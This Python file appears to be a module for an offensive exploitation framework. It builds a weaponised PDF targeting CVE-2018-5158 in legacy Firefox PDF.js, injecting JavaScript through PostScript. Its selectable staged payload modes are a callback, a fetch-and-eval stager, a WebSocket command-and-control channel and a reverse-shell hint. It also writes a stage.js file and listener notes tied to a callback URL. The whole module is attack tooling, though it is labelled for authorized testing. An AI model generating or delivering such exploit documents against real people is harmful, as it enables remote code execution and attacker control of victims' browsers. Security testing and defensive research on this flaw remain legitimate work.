#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pathlib import Path
from typing import List

from kittysploit import *
from lib.pdf.rce import (
    build_pdfjs_js,
    build_stage_js_template,
    create_pdfjs_postscript_rce,
    write_listener_notes,
)
from lib.pdf.mixins import PdfRceMixin


class Module(Auxiliary, PdfRceMixin):
    __info__ = {
        "name": "PDF CVE-2018-5158 PDF.js PostScript Staged Delivery",
        "description": (
            "Generate CVE-2018-5158 PDF with PostScript calculator JavaScript injection "
            "and staged payloads (callback, fetch+eval, WebSocket). Uses CALLBACK_URL. "
            "For authorized testing against legacy Firefox PDF.js (< 60)."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://www.mozilla.org/en-US/security/advisories/mfsa2018-12/",
        ],
        "tags": ["pdf", "cve-2018-5158", "pdfjs", "firefox", "stager", "authorized-only"],
    }

    MODULE_TITLE = "CVE-2018-5158 PDF.js PostScript staged delivery"
    OUTPUT_BASENAME = "cve_2018_5158_staged.pdf"
    CVE_IDS = ["CVE-2018-5158"]

    payload_mode = OptChoice(
        "fetch_stager",
        "Staged payload mode",
        required=True,
        choices=["callback", "fetch_stager", "websocket_c2", "reverse_shell_hint"],
    )

    def generate_pdf_rce_artifacts(self, output_path: Path) -> List[Path]:
        mode = str(self.payload_mode)
        stage = self._stage_url()
        js = build_pdfjs_js(
            mode,
            lhost="",
            lport=0,
            stage_url=stage,
        )
        create_pdfjs_postscript_rce(output_path, js)

        out_dir = self._output_dir()
        artifacts: List[Path] = [output_path]

        if mode in ("fetch_stager", "reverse_shell_hint", "websocket_c2"):
            stage_js = out_dir / "stage.js"
            stage_js.write_text(
                build_stage_js_template(mode, lhost="", lport=0),
                encoding="utf-8",
            )
            artifacts.append(stage_js)

        artifacts.append(
            write_listener_notes(
                out_dir,
                title="CVE-2018-5158 PDF.js PostScript staged delivery",
                stage_url=stage,
                payload_mode=mode,
            )
        )
        return artifacts

    def run(self):
        return self.run_pdf_rce()
